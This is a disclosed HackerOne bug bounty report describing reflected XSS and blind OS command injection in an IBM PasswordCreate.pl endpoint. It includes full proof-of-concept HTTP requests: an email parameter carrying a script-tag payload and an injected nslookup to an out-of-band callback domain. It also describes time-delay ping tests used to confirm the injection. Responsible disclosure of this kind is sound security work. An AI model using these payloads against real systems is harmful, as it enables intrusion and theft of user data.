# Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com

## Report Details
- **Report ID**: 410334
- **URL**: https://hackerone.com/reports/410334
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-16T14:35:35.912Z
- **Disclosed**: 2022-02-04T18:23:07.515Z

## Reporter
- **Username**: ragnaroc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibm

## Vulnerability Information
I found an XSS and Blind OS based injection issue due to the incorrect handling of the  characters in THE EMAIL  get& post parameters.  A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com


https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi

OSCOMMAND INJECT

POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=-------------------------&ibm-submit=Submit

For the blind os command injection i used three variables:_
1. A random email address (To bench mark the normal responce time
2.  Ping requests  of 10 and 20 seconds 

The reply from the server prooved that the  time-delay inference existed.

See attached videos and images for POC

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from  user base and lure them to malicious websites on the internet on behalf of IBM website.

## Attachments
- XSSPOC.PNG
- POC1.PNG
- POC2.PNG
- POC3.PNG
- Command_injection.flv
- XSS.flv
